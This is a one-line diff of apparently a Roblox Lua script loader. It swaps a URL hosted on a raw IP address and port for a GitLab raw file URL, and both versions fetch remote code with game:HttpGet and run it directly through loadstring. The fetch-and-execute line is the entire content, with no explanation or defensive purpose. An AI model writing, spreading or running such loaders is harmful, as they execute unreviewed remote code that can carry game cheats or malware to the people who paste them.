@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImE3MjY2MDMwLTYwNmYtNDg4Mi1hOWZjLWU0ZGZiYmI1MWNlMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+loadstring(game:HttpGet("https://gitlab.com/tesexrahy/lua-storage/-/raw/main/root.luau?ref_type=heads"))()
